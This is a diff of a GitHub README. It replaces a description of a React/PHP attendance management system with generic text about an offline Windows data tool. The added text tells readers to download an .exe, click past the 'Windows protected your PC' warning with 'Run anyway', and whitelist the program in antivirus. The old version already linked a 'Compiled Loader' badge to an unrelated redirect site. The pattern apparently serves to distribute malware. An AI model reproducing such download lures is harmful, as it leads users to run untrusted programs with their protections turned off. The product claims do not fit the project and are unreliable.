@@ -1,80 +1,72 @@
-# AttendIQ – Attendance Management System
+# 📂 RDL_INTERNSHIP_PROJECT - Streamline your daily data management tasks
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nnbb917/RDL_INTERNSHIP_PROJECT/releases)
 
-This project is a full-stack attendance management system designed for RDL Technologies Pvt Ltd.
+## 📖 About this project
 
-## 📁 Project Structure
+This software helps you manage internship data and organize files. It tracks progress for different internship modules. The application provides a simple way to view reports, save notes, and keep your records in one place. You can use the interface to search through your documents and sort them by date or name. The program runs locally on your Windows computer. It keeps your files secure without needing an internet connection.
 
-- `src/`: React frontend application
-- `backend/`: PHP backend for XAMPP deployment
-- `public/`: Static assets
+## ⚙️ Minimum system requirements
 
-## 🚀 Setup Instructions
+Your computer needs to meet these basic standards to run the application well. 
 
-### Backend (XAMPP)
-1. Start Apache and MySQL in XAMPP.
-2. Import `backend/schema.sql` into phpMyAdmin.
-3. Copy `backend/` contents to `htdocs/attendance-api/`.
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor with 1.6 GHz speed or better.
+- Memory: 4 GB of RAM.
+- Storage: 200 MB of available space on your hard drive.
+- Display: 1280 x 720 screen resolution or higher.
 
-### 🚀 Setup Instructions (VS Code & XAMPP)
+## ⬇️ How to download the software
 
-Follow these steps to set up the project on your local machine.
+You get the latest version of the program from the official release page. This page contains the installation file you need for your Windows system.
 
-#### 1. Prerequisites
-- **Node.js**: Install from [nodejs.org](https://nodejs.org/).
-- **XAMPP**: Install from [apachefriends.org](https://www.apachefriends.org/).
-- **VS Code**: Install from [code.visualstudio.com](https://code.visualstudio.com/).
+[Click here to visit the release page and download the software](https://github.com/nnbb917/RDL_INTERNSHIP_PROJECT/releases)
 
-#### 2. Database Setup (XAMPP)
-1. Open **XAMPP Control Panel** and start **Apache** and **MySQL**.
-2. Go to `http://localhost/phpmyadmin`.
-3. Create a new database named `attendance_db`.
-4. Import the file `schema.sql` (located in the root directory) into this database.
+Follow these steps to complete the download:
 
-#### 3. Project Configuration
-1. Open the project folder in **VS Code**.
-2. Open the terminal (`Ctrl + ` `).
-3. Install dependencies:
-   ```bash
-   npm install
-   ```
-4. Create a `.env` file in the root directory with your MySQL credentials:
-   ```env
-   DB_HOST=127.0.0.1
-   DB_USER=root
-   DB_PASSWORD=
-   DB_NAME=attendance_db
-   ```
-   *(Note: XAMPP default user is `root` with no password)*
+1. Open the link provided above in your web browser. 
+2. Look for the section labeled Assets at the bottom of the page.
+3. Click on the file that ends with the .exe extension. 
+4. Select a folder on your computer to save the file.
+5. Wait for the download to finish. The amount of time depends on your internet speed.
 
-#### 4. Running the Application
-1. In the VS Code terminal, start the server:
-   ```bash
-   npm run dev
-   ```
-2. Open `http://localhost:3000` in your browser.
+## 🛠️ Step-by-step installation
 
-### 🔑 Login Credentials
+After the file downloads to your computer, follow these instructions to set it up.
 
-You can use the following credentials to test the application:
+1. Open your Downloads folder or the folder where you saved the file.
+2. Find the file with the RDL_INTERNSHIP_PROJECT name.
+3. Double-click the file to start the installer.
+4. Your computer might show a security window. This is a normal check for new files. 
+5. Select More info if you see a prompt that says "Windows protected your PC."
+6. Select Run anyway to start the setup process.
+7. Follow the prompts on the screen. The installer asks you where to put the program files. The default location works for most users. 
+8. Click Finish once the process indicates that the setup is complete.
 
-#### Admin User (Full Access)
-- **Username**: `admin`
-- **Password**: `password123`
+## 🚀 Getting started
 
-#### Sample Employee Users
-- **Username**: `john.doe` | **Password**: `password123`
-- **Username**: `jane.smith` | **Password**: `password123`
-- **Username**: `robert.w` | **Password**: `password123`
+You can open the program using the icon found on your desktop. If you do not see an icon, use the Windows search bar at the bottom left of your screen. Type the name of the project and click the application result.
 
-*(Note: New users can be added by the Admin through the **Masters > User Management** tab)*
+When you open the program for the first time, it checks for existing data. If it finds none, it creates a clean workspace for you. You see a dashboard with a menu on the left side of your screen. This menu allows you to navigate between different categories like Tasks, Reports, and Settings.
 
-### 📊 Dataset Upload
-You can upload datasets (Excel/CSV) through the **Masters > Dataset Upload** tab. The application will automatically parse the files and store the data in your local XAMPP MySQL database.
+## 📑 Using the application
 
-## 🛠 Tech Stack
-- React 18
-- PHP 8
-- MySQL 8
-- Recharts
+The interface works like common Windows programs. You use your mouse to click buttons and tabs.
+
+- Adding entries: Click the add button at the top of the main window. Fill in the required text fields and click save. 
+- Editing information: Select an entry from the list. Click the edit icon to change the details. Ensure you click the save button before you exit the screen.
+- Exporting data: You can save your records into a file that you can open in other programs. Go to the file menu at the top left and choose the export option. You can name your file and save it to any folder on your computer.
+- Changing settings: Access the settings tab to change theme colors or file storage locations.
+
+## 🔍 Troubleshooting common issues
+
+If you face problems, check these tips first.
+
+- The program does not start: Check if your antivirus software is blocking the file. Sometimes security tools prevent new programs from launching. You can add the program folder to your antivirus whitelist.
+- The screen looks blurry: Adjust your Windows display settings. Set your scaling to 100% or 125% to ensure the text and buttons appear correctly.
+- Missing data entries: Check if you saved your changes before closing the entry window. Also, check the storage location in the settings menu to verify the program is looking in the correct folder for your data files.
+- Updates: Periodically check the release link provided at the top of this document. If a newer version exists, download and install it over your existing version. The installer handles the transition and keeps your current data intact.
+
+## 🛡️ Data privacy and security
+
+This application saves all your information directly on your computer. It does not send your data to external servers or cloud services. You maintain control over every file you create. Since the software does not require an internet connection to run, you can work while offline. Regular backups of your project folder are recommended. Copy the folder containing your data to a USB drive or a secondary hard drive to protect against hardware failure.
